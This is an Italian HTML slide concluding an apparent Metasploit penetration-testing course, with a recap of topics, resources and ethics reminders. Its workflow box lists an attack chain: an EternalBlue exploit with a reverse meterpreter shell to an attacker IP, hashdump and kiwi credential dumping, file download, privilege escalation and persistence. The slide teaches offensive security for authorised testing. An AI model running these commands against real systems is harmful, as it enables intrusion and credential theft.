@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Conclusioni e Risorse</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">🎓 Conclusioni</h1>
+        <div class="subtitle">Riepilogo e prossimi passi nel tuo percorso di security</div>
+
+        <div class="card border-purple" style="margin-bottom: 25px;">
+            <div class="card-title">📚 Cosa Abbiamo Imparato</div>
+            <div class="card-text">
+                <div class="grid-2-col">
+                    <div>
+                        <p><strong>Fondamenti:</strong></p>
+                        <ul style="margin-top: 10px; line-height: 1.8;">
+                            <li>✅ Filosofia degli strumenti automatizzati</li>
+                            <li>✅ Architettura di Metasploit Framework</li>
+                            <li>✅ MSFconsole e interfaccia command-line</li>
+                            <li>✅ MSF Engagement Structure (5 fasi)</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <p><strong>Componenti Core:</strong></p>
+                        <ul style="margin-top: 10px; line-height: 1.8;">
+                            <li>✅ Moduli (Exploits, Auxiliary, Post)</li>
+                            <li>✅ Payloads (Singles, Stagers, Stages)</li>
+                            <li>✅ Meterpreter e post-exploitation</li>
+                            <li>✅ Encoders e evasione</li>
+                            <li>✅ Database PostgreSQL e workspaces</li>
+                            <li>✅ Plugins e estensioni</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card border-blue" style="margin-bottom: 25px;">
+            <div class="card-title">🎯 Workflow Completo</div>
+            <div class="card-text">
+                <p>Il processo tipico di un penetration test con Metasploit:</p>
+                <br>
+                <div class="code-box" style="font-size: 1em;">1️⃣ ENUMERATION
+   └─> db_nmap -sV -sC target
+   └─> hosts, services
+
+2️⃣ PREPARATION
+   └─> search cve:2021 type:exploit
+   └─> use exploit/windows/smb/ms17_010
+   └─> set payload windows/x64/meterpreter/reverse_tcp
+
+3️⃣ EXPLOITATION
+   └─> set RHOSTS target_ip
+   └─> set LHOST attacker_ip
+   └─> check
+   └─> exploit
+
+4️⃣ POST-EXPLOITATION
+   └─> sysinfo, getuid
+   └─> hashdump, load kiwi
+   └─> screenshot, download files
+   └─> run post/multi/recon/local_exploit_suggester
+
+5️⃣ PRIVILEGE ESCALATION & PERSISTENCE
+   └─> getsystem
+   └─> run persistence -X -i 60
+   └─> migrate to stable process</div>
+            </div>
+        </div>
+
+        <div class="grid-2-col">
+            <div class="card border-green">
+                <div class="card-title">🔥 Prossimi Passi</div>
+                <div class="card-text">
+                    <p><strong>Per approfondire:</strong></p>
+                    <ul style="margin-top: 10px; line-height: 1.8;">
+                        <li>🎯 Pratica su HackTheBox, TryHackMe</li>
+                        <li>📝 Studia exploit development</li>
+                        <li>🔍 Impara Cobalt Strike, Empire</li>
+                        <li>🛡️ Approfondisci AV evasion avanzata</li>
+                        <li>🌐 Pivoting e lateral movement</li>
+                        <li>📊 Red Team operations</li>
+                        <li>🔐 Active Directory exploitation</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="card border-yellow">
+                <div class="card-title">📖 Risorse Utili</div>
+                <div class="card-text">
+                    <p><strong>Documentazione:</strong></p>
+                    <ul style="margin-top: 10px; line-height: 1.8;">
+                        <li>🌐 docs.metasploit.com</li>
+                        <li>📚 Offensive Security (OSCP)</li>
+                        <li>🎓 HackTheBox Academy</li>
+                        <li>📖 The Hacker Playbook series</li>
+                    </ul>
+                    <br>
+                    <p><strong>Community:</strong></p>
+                    <ul style="margin-top: 10px; line-height: 1.8;">
+                        <li>💬 Metasploit Slack</li>
+                        <li>🐦 @metasploit Twitter</li>
+                        <li>📺 Rapid7 Blog</li>
+                        <li>🎥 IppSec YouTube</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="card border-red" style="margin-top: 25px;">
+            <div class="card-title">⚠️ Ricorda Sempre</div>
+            <div class="card-text">
+                <p style="font-size: 1.2em; line-height: 1.8;">
+                    <strong>1. Etica e Legalità:</strong> Usa queste conoscenze SOLO su sistemi autorizzati. L'accesso non autorizzato è reato (Art. 615-ter C.P.)
+                    <br><br>
+                    <strong>2. Apprendimento Continuo:</strong> La sicurezza informatica evolve rapidamente. Mantieniti aggiornato!
+                    <br><br>
+                    <strong>3. Pensiero Critico:</strong> Gli strumenti sono assistenti, non sostituiscono la tua conoscenza e creatività.
+                    <br><br>
+                    <strong>4. Responsabilità:</strong> Con grandi poteri vengono grandi responsabilità. Usa le tue skill per proteggere, non per danneggiare.
+                </p>
+            </div>
+        </div>
+
+        <div class="card border-purple" style="margin-top: 25px;">
+            <div class="card-title">🚀 Buon Hacking (Etico)!</div>
+            <div class="card-text" style="text-align: center;">
+                <p style="font-size: 1.3em; color: #fff; font-weight: 600;">Grazie per aver seguito questo corso!</p>
+                <br>
+                <p style="font-size: 1.1em;">Metasploit è uno strumento potentissimo, ma ricorda:</p>
+                <p style="font-size: 1.2em; color: #4CAF50; font-weight: 600; margin-top: 15px;">
+                    "The best hackers are those who hack for good."
+                </p>
+                <br>
+                <p style="font-size: 2em; margin-top: 20px;">🛡️ 💻 🔐</p>
+            </div>
+        </div>
+    </div>
+
+    <script>const slideNumero = 25;</script>
+    <script src="main.js"></script>
+</body>
+</html>
